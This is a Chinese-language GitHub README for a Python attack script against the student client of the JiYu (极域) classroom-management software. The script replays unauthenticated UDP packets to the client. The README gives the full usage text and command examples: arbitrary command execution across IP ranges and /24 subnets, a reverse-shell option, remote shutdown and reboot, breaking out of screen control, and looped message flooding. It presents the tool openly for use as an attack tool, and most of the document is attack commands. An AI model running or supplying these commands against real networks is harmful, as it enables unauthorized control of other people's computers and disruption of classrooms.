
# 极域电子教室数据包(udp)重放攻击脚本
[![GitHub stars](https://img.shields.io/github/stars/ht0Ruial/Jiyu_udp_attack)](https://github.com/ht0Ruial/Jiyu_udp_attack/stargazers) [![GitHub forks](https://img.shields.io/github/forks/ht0Ruial/Jiyu_udp_attack)](https://github.com/ht0Ruial/Jiyu_udp_attack/network) [![GitHub release](https://img.shields.io/github/release/ht0Ruial/Jiyu_udp_attack.svg)](https://github.com/ht0Ruial/Jiyu_udp_attack/releases/latest)

+ 因为极域的学生端没有对接收到的udp包做(=・ω・=)身份验证，导致了我们可以构造特定的数据包让学生端来执行，从而实现命令执行攻击机房内上线的任意学生端机器。
## 运行环境
+ Python3

## 版本说明
v1.5
- 修复命令执行bug

v1.4
- 代码重构，优化参数选取逻辑
- 反弹shell功能增加随机端口
- 更新文档

v1.3
- 脱离/恢复屏幕控制
- 支持反弹shell

v1.2
- 修复bug

v1.1
- -g 选项支持获取学生端监听的端口

v1.0
- 首次提交




## 使用方法：
```
usage:

    ------------------- Github Repositories -------------------
            https://github.com/ht0Ruial/Jiyu_udp_attack

       [-h] -ip IP [-p P] [-msg MSG] [-c C] [-l L] [-t T]
       [-e {r,s,g,nc,break,continue}]
       {r,s,g,nc,break,continue} ...

positional arguments:
  {r,s,g,nc,break,continue}
                        -e 参数的详细说明
    r                   reboot 重启
    s                   shutdown 关机
    g                   独立选项，获取当前的ip地址以及学生端监听的端口
    nc                  独立选项，反弹shell的机器需出网，退出可使用命令exit
    break               独立选项，脱离屏幕控制，需要管理员权限
    continue            独立选项，恢复屏幕控制

optional arguments:
  -h, --help            show this help message and exit
  -ip IP                ip 指定目标IP地址
  -p P                  port 指定监听端口，默认端口为4705
  -msg MSG              send_message发送消息 eg: -msg "HelloWord!"
  -c C                  command命令 eg: -c "cmd.exe /c ipconfig"
  -l L                  循环次数，默认为1
  -t T                  循环时间间隔，默认是22秒
  -e {r,s,g,nc,break,continue}
                        Extra Options加载额外的选项 eg：-e r
          
```

## 使用例子

### Tips:
使用 **-ip** 参数指定目标IP时，可以有以下几种指定方式：
- 指定单个IP，如  192.168.80.12
- 指定IP范围，如 192.168.80.10-56
- 指定IP所在C段，如 192.168.80.1/24



### 1.获取内网ip地址及监听的端口
若学生端监听端口不是默认的**4705**，则在后续操作过程中需使用 **-p** 参数指定端口
```
python Jiyu_udp_attack.py -e g
```

### 2.脱离屏幕控制
当前运行权限需为管理员权限，主要用于开启MpsSvc服务
```
python Jiyu_udp_attack.py -e break
```

### 3.恢复屏幕控制
```
python Jiyu_udp_attack.py -e continue
```

### 4.发送消息
若学生端监听端口为**4705**，向IP地址为192.168.80.12的机器发送一条内容为"hello,baby!"的消息
```
python Jiyu_udp_attack.py -ip 192.168.80.12 -msg "hello,baby!"

```

若学生端监听端口为**4605**，需使用 **-p** 参数指定端口，向IP地址为192.168.80.12的机器发送一条内容为"hello,baby!"的消息
```
python Jiyu_udp_attack.py -ip 192.168.80.12 -p 4605 -msg "hello,baby!"

```

### 5.执行命令
给192.168.80.12到192.168.80.137弹一个计算器
```
python Jiyu_udp_attack.py -ip 192.168.80.12-137 -c calc.exe
```

### 6.反弹shell
反弹shell时，IP只能为某个机器IP，不能批量反弹，而且机器需要出网<br>
因为已经实现批量的任意命令执行，考虑到批量反弹也没啥意义，遂不添加
```
python Jiyu_udp_attack.py -ip 192.168.80.12 -e nc
```

### 7.关机重启
关机
```
python Jiyu_udp_attack.py -ip 192.168.80.12 -e s
```
重启
```
python Jiyu_udp_attack.py -ip 192.168.80.12 -e r
```

### 8.循环
利用循环持续发送消息<br>
1-254的机器会收到一条"hello,baby!"的消息，50s后会继续执行，共执行3次
```
    python Jiyu_udp_attack.py -ip 192.168.80.23/24 -msg "hello,baby!" -l 3 -t 50
```





